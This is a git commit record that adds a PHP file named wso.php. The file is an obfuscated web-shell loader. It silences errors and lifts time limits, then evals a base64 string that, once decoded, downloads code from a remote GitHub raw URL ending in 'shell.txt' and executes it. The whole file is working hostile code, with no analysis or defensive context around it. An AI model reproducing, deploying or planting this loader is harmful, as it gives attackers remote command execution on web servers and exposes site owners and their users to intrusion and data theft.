0e396ae973f34ecbda89d5030acbd2b1264d7d10
Github User <84887432+1337r0j4n@users.noreply.github.com>
2024-05-09 10:04:34 +0630

    Add files via upload

---
+++ FILE5/wso.php
@@ -0,0 +1,15 @@
+<?php
+@set_time_limit(0);
+@ini_set('html_errors', '0');
+@clearstatcache();
+$d_17b31f50 = false;
+if ($d_17b31f50) {
+    error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
+    @ini_set('display_errors', '1');
+    @ini_set('log_errors', '1'); 
+} else {
+    error_reporting(0);
+    @ini_set('display_errors', '0');
+    @ini_set('log_errors', '0');
+}
+eval(base64_decode('CiBldmFsKHVybGRlY29kZSgiXDQ1XHgzM1x4NjZcNDVceDMzXDE0NSIpIC4gZmlsZV9nZXRfY29udGVudHModXJsZGVjb2RlKCJceDY4XDE2NFx4NzRceDcwXHg3M1x4M2FceDJmXHgyZlx4NzJceDYxXHg3N1x4MmVcMTQ3XDE1MVwxNjRceDY4XDE2NVwxNDJcMTY1XHg3M1wxNDVceDcyXDE0M1wxNTdcMTU2XHg3NFwxNDVcMTU2XHg3NFw1Nlx4NjNcMTU3XHg2ZFw1N1x4NzVcMTU2XHg2MVx4NmRceDY1XHg3OFwxNTFceDY0XDU3XDE0M1x4NmZceDZjXDE1NFx4NjVceDYzXDE2NFx4MmZceDZkXDE0MVwxNTFceDZlXDU3XHg3OFw1N1wxNjNceDY4XDE0NVx4NmNcMTU0XHgyZVwxNjRcMTcwXDE2NCIpKSk7IA==')); ?>
